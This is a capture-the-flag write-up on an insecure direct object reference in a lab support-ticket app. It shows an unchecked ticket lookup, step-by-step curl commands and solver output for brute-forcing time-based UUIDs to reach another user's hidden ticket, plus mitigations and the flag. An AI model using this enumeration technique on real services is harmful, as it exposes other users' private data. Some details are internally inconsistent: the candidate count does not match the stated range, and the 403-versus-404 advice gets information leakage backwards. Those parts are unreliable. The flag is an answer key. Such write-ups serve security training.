# CTF Challenge: IDOR via Support Tickets — UUID Sandwich Attack

**Category:** Web / Insecure Direct Object Reference (IDOR)  
**Difficulty:** Medium  
**Flag:** `CTF{1d0r_uu1d_s4ndw1ch_pwn3d}`

---

## Description

LoopyMart has a support-ticket system.  Users can submit tickets via
`POST /tickets` and read their own tickets via `GET /tickets/mine`.  However a
second read endpoint — `GET /tickets/{ticket_uuid}` — is provided "for
convenience" and performs **no ownership check**.  Any authenticated user can
retrieve any ticket using only its UUID.

The server generates ticket UUIDs with Python's `uuid.uuid1()` (RFC 4122 version 1).  
Version-1 UUIDs embed a **60-bit monotonic timestamp** (100 ns resolution,
epoch = 1582-10-15) in a well-known field layout.  This means UUIDs created
close together in time are predictable once you hold a UUID from *before* and a
UUID from *after* the target.

---

## Vulnerability

| Property | Value |
|---|---|
| **Endpoint (IDOR sink)** | `GET /tickets/{ticket_uuid}` |
| **File** | `backend/app/api/tickets.py` — `get_ticket()` |
| **DB helper** | `backend/app/db/tickets_mongo.py` — `ticket_get_by_uuid()` |
| **Root cause** | Lookup is performed on `ticket_uuid` field only; `user_id` is never checked |
| **CWE** | CWE-639 — Authorization Bypass Through User-Controlled Key |

### Vulnerable sink

```python
# tickets_mongo.py
async def ticket_get_by_uuid(ticket_uuid: str) -> dict | None:
    db = get_mongo_db()
    doc = await db.support_tickets.find_one({"ticket_uuid": ticket_uuid})  # no user_id!
    return _doc_to_ticket(doc) if doc else None
```

---

## UUID Sandwich Mechanic

Every `POST /tickets` call secretly creates **two** tickets:

```
POST /tickets
  │
  ├─ 1. Insert user ticket    →  uuid_A  (returned to caller)
  ├─ 2. sleep(1 ms)
  └─ 3. Insert internal ticket →  uuid_B  (hidden, contains flag)
```

Because UUIDv1 timestamps are monotonically increasing, two consecutive
`POST /tickets` calls from the attacker bracket the hidden ticket:

```
uuid_A  <  uuid_B  <  uuid_C
 ↑ 1st user ticket    ↑ 2nd user ticket
           ↑ hidden (flag here)
```

---

## Exploitation

### Step-by-step (manual)

```bash
BASE=http://localhost:8001

# 1. Get a token
TOKEN=$(curl -s -X POST $BASE/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"you@example.com","password":"pass"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. Create ticket A — note the returned ticket_uuid
UUID_A=$(curl -s -X POST $BASE/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"subject":"hello","message":"world"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['ticket_uuid'])")

# 3. Create ticket C
UUID_C=$(curl -s -X POST $BASE/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"subject":"hello2","message":"world2"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['ticket_uuid'])")

echo "Sandwich: $UUID_A ... ??? ... $UUID_C"

# 4. Enumerate UUIDs between A and C (automated — see solve.py)
```

### Automated

```bash
python solutions/idor-uuid-sandwich/solve.py \
  --email you@example.com \
  --password yourpassword
```

Expected output:
```
[*] Logged in as you@example.com
[*] Ticket A: 12345678-abcd-11ef-8000-xxxxxxxxxxxx
[*] Ticket C: 22345678-abcd-11ef-8000-xxxxxxxxxxxx
[*] UUID range: 12345679 → 22345677 (≈ 85 312 candidates @ 100 ns steps)
[*] Probing with 500 concurrent workers …
[+] Found hidden ticket at: 1a345678-abcd-11ef-8000-xxxxxxxxxxxx
[+] Flag: CTF{1d0r_uu1d_s4ndw1ch_pwn3d}
```

---

## Mitigation

1. **Add ownership check** in `ticket_get_by_uuid` or in the router:
   ```python
   doc = await db.support_tickets.find_one(
       {"ticket_uuid": ticket_uuid, "user_id": current_user.id}
   )
   ```
2. **Use random (non-time-based) identifiers** — replace `uuid.uuid1()` with
   `uuid.uuid4()` so identifiers cannot be brute-forced via timestamp enumeration.
3. **Return 403 (not 404)** when the ticket exists but belongs to another user, to
   prevent information leakage about object existence.

---

## Flag

```
CTF{1d0r_uu1d_s4ndw1ch_pwn3d}
```
